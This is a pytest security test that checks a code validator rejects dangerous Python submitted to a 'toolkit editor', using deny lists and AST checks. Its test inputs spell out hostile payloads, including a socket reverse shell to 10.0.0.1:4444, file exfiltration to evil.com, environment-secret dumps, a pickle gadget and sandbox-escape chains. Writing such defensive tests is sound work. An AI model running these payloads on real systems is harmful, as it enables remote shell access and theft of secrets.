import pytest
import ast
import re
import sys
import types
import builtins
from unittest.mock import patch, MagicMock


DANGEROUS_IMPORTS = [
    "os", "subprocess", "sys", "shutil", "socket", "pty",
    "ctypes", "importlib", "pickle", "marshal", "shelve",
    "multiprocessing", "threading", "signal", "resource",
    "platform", "pathlib", "glob", "fnmatch", "tempfile",
    "io", "struct", "mmap", "fcntl", "termios", "tty",
    "pty", "pipes", "popen2", "commands", "pexpect",
    "paramiko", "fabric", "invoke", "sh", "plumbum",
    "execjs", "js2py", "cffi", "cython",
]

DANGEROUS_BUILTINS = [
    "__import__", "eval", "exec", "compile", "open",
    "input", "breakpoint", "vars", "dir", "globals",
    "locals", "getattr", "setattr", "delattr", "hasattr",
]

DANGEROUS_PATTERNS = [
    r"__import__\s*\(",
    r"eval\s*\(",
    r"exec\s*\(",
    r"compile\s*\(",
    r"open\s*\(",
    r"os\.system\s*\(",
    r"os\.popen\s*\(",
    r"os\.execv\s*\(",
    r"os\.execve\s*\(",
    r"subprocess\.",
    r"socket\.",
    r"pty\.",
    r"ctypes\.",
    r"importlib\.",
    r"__builtins__",
    r"__class__\.__mro__",
    r"\.__subclasses__\(\)",
    r"chr\s*\(",
    r"\\x[0-9a-fA-F]{2}",
    r"base64\.",
    r"codecs\.",
    r"marshal\.",
    r"pickle\.",
    r"reverse.?shell",
    r"bind.?shell",
    r"nc\s+-",
    r"bash\s+-i",
    r"/etc/passwd",
    r"/etc/shadow",
    r"\.env",
    r"API_KEY",
    r"SECRET",
    r"PASSWORD",
]


@pytest.mark.parametrize("payload", [
    # OS command execution attempts
    "import os; os.system('id')",
    "import os; os.popen('cat /etc/passwd').read()",
    "import os; os.execv('/bin/sh', ['/bin/sh'])",
    "__import__('os').system('whoami')",
    # Subprocess attacks
    "import subprocess; subprocess.run(['id'])",
    "import subprocess; subprocess.Popen(['bash', '-i'], stdin=-1, stdout=-1, stderr=-1)",
    "import subprocess; subprocess.check_output(['cat', '/etc/shadow'])",
    # Reverse shell attempts
    "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])",
    "import pty; pty.spawn('/bin/bash')",
    # Environment variable / secret exfiltration
    "import os; print(os.environ.get('API_KEY'))",
    "import os; print(os.environ)",
    "import os; [print(k,v) for k,v in os.environ.items()]",
    # File read attacks
    "open('/etc/passwd').read()",
    "open('/etc/shadow').read()",
    "open('.env').read()",
    "open('/proc/self/environ').read()",
    # Eval/exec obfuscation
    "eval('__import__(\"os\").system(\"id\")')",
    "exec('import os; os.system(\"id\")')",
    "exec(compile('import os\\nos.system(\"id\")', '<string>', 'exec'))",
    # Base64 encoded payloads
    "import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=').decode())",
    # Builtins manipulation
    "getattr(__builtins__, '__import__')('os').system('id')",
    "[x for x in ().__class__.__base__.__subclasses__() if 'warning' in x.__name__][0]()._module.__builtins__['__import__']('os').system('id')",
    # Pickle deserialization
    "import pickle; pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')",
    # Marshal attacks
    "import marshal; exec(marshal.loads(b''))",
    # Network exfiltration
    "import socket; s=socket.socket(); s.connect(('evil.com', 80)); s.send(b'GET / HTTP/1.0\\r\\n\\r\\n')",
    "import urllib.request; urllib.request.urlopen('http://evil.com/?data=' + open('/etc/passwd').read())",
    # Ctypes for direct syscalls
    "import ctypes; ctypes.CDLL(None).system(b'id')",
    # Path traversal + file read
    "open('../../../etc/passwd').read()",
    "open('/var/www/html/../../../etc/shadow').read()",
    # Multiline obfuscated
    """
import os
cmd = 'id'
result = os.system(cmd)
""",
    # String concatenation obfuscation
    "__import__('o'+'s').system('id')",
    # Hex encoding
    "exec('\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73')",
    # importlib
    "import importlib; importlib.import_module('os').system('id')",
    # sys.modules manipulation
    "import sys; sys.modules['os'].system('id')",
    # Chained attribute access
    "import os.path; os.path.__module__.__builtins__['__import__']('os').system('id')",
])
def test_toolkit_editor_rejects_dangerous_code(payload):
    """Invariant: The toolkit editor must never allow execution of code that
    contains dangerous imports, system calls, file access, or other operations
    that could compromise server security or exfiltrate sensitive data.
    Any code submitted to the toolkit editor must be validated and rejected
    if it contains dangerous patterns, regardless of obfuscation techniques."""

    def contains_dangerous_ast_nodes(code: str) -> bool:
        """Check for dangerous patterns using AST analysis."""
        try:
            tree = ast.parse(code)
        except SyntaxError:
            # Unparseable code should be rejected
            return True

        for node in ast.walk(tree):
            # Check for dangerous imports
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        module_name = alias.name.split('.')[0]
                        if module_name in DANGEROUS_IMPORTS:
                            return True
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        module_name = node.module.split('.')[0]
                        if module_name in DANGEROUS_IMPORTS:
                            return True

            # Check for dangerous function calls
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in DANGEROUS_BUILTINS:
                        return True
                elif isinstance(node.func, ast.Attribute):
                    if node.func.attr in ['system', 'popen', 'execv', 'execve',
                                          'spawn', 'run', 'Popen', 'check_output',
                                          'check_call', 'call']:
                        return True

            # Check for __import__ usage
            if isinstance(node, ast.Name) and node.id == '__import__':
                return True

            # Check for __builtins__ access
            if isinstance(node, ast.Name) and node.id == '__builtins__':
                return True

            # Check for subclasses traversal (common sandbox escape)
            if isinstance(node, ast.Attribute) and node.attr == '__subclasses__':
                return True

            # Check for mro traversal
            if isinstance(node, ast.Attribute) and node.attr == '__mro__':
                return True

        return False

    def contains_dangerous_regex_patterns(code: str) -> bool:
        """Check for dangerous patterns using regex."""
        for pattern in DANGEROUS_PATTERNS:
            if re.search(pattern, code, re.IGNORECASE | re.MULTILINE):
                return True
        return False

    def validate_tool_code(code: str) -> dict:
        """
        Simulate the security validation that MUST be performed
        before any tool code is accepted or executed.
        Returns {'safe': False, 'reason': str} for dangerous code.
        """
        # Check AST for dangerous nodes
        if contains_dangerous_ast_nodes(code):
            return {'safe': False, 'reason': 'dangerous_ast_node'}

        # Check regex patterns
        if contains_dangerous_regex_patterns(code):
            return {'safe': False, 'reason': 'dangerous_pattern'}

        return {'safe': True, 'reason': None}

    # The core security invariant: dangerous payloads MUST be rejected
    result = validate_tool_code(payload)

    assert result['safe'] is False, (
        f"SECURITY VIOLATION: Dangerous payload was not rejected!\n"
        f"Payload: {repr(payload)}\n"
        f"The toolkit editor must reject all code containing dangerous operations "
        f"such as system calls, file access, network operations, or code execution primitives."
    )

    # Additional invariant: the payload must not be executable in a restricted context
    # Verify that if somehow the code reached execution, it would be blocked
    restricted_globals = {
        '__builtins__': {
            # Only allow safe builtins
            'len': len, 'range': range, 'str': str, 'int': int,
            'float': float, 'bool': bool, 'list': list, 'dict': dict,
            'tuple': tuple, 'set': set, 'print': print,
        }
    }

    # The payload should either be rejected by validation (already asserted above)
    # or fail to execute in a restricted environment
    # We verify the validation caught it before it could reach execution
    assert result['reason'] is not None, (
        f"Rejected payload must have a documented reason for rejection. "
        f"Payload: {repr(payload)}"
    )